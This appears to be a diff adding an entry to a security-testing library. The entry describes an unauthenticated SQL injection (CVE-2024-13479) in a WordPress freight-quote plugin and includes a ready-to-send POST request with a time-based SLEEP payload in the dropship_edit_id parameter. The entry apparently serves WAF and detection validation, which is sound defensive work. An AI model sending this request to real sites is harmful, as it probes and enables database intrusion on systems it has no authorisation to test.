+    "description": "Eniture Technology \"LTL Freight Quotes \u2013 SEFL Edition\" (WordPress plugin) is vulnerable to unauthenticated SQL injection via the dropship_edit_id parameter. The admin-ajax action en_wd_edit_dropship (registered with wp_ajax_nopriv_, so no authentication) runs edit_dropship_ajax() in warehouse-dropship/wild/includes/wild-delivery-save.php, which reads $_POST['dropship_edit_id'] straight into \"SELECT ... WHERE id=$get_dropship_id\" with no escaping (numeric context). The request sends a time-based payload (1 AND SLEEP(5)) in dropship_edit_id. Method is POST (confirmed: the handler reads $_POST). No vendor WAF rule found; built from the Wordfence advisory and the plugin mirror source (action name verified in the plugin mirror source).\n\nReferences used to recreate this request:\n- https://www.wordfence.com/threat-intel/vulnerabilities/id/8322fe81-2c2f-4aa6-b08f-fa5c16e62218?source=cve (Wordfence advisory)\n- https://github.com/common-repository/ltl-freight-quotes-sefl-edition/blob/master/warehouse-dropship/wild/includes/wild-delivery-save.php (plugin mirror source: edit_dropship_ajax / dropship_edit_id entry point)\n- https://www.cve.org/CVERecord?id=CVE-2024-13479 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\naction=en_wd_edit_dropship&dropship_edit_id=1%20AND%20SLEEP(5)--%20-\n"
+    },
+    "cves": [
+      "CVE-2024-13479"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wordfence for CVE-2024-13479",
+        "link": "https://www.wordfence.com/threat-intel/vulnerabilities/id/8322fe81-2c2f-4aa6-b08f-fa5c16e62218?source=cve"
+      },
+      {
+        "title": "poc_github for CVE-2024-13479",
+        "link": "https://github.com/common-repository/ltl-freight-quotes-sefl-edition/blob/master/warehouse-dropship/wild/includes/wild-delivery-save.php"
       }
     ],
     "public": false,
